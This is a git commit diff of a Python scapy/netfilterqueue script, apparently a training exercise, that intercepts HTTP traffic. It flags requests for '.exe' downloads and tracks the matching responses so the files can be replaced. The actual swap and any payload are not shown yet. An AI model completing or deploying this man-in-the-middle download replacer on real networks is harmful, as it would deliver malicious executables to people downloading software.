ab0008c4f773c0a1e49a027e78ee222ee9be1676
root <tahamb05@gmail.com>
2024-09-11 14:11:26 -0400

    capturing packet and chekcing if there is an download request

--- replace_downloads.py
+++ replace_downloads.py
@@ -3,16 +3,21 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            print("HTTP request")
-            print(scapy_packet.show())
+            if ".exe" in scapy_packet[scapy.Raw].load:
+                print("[+]exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("HTTP response")
-            print(scapy_packet.show())
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+]Replacing file")
+                print(scapy_packet.show())
 
 
     packet.accept()
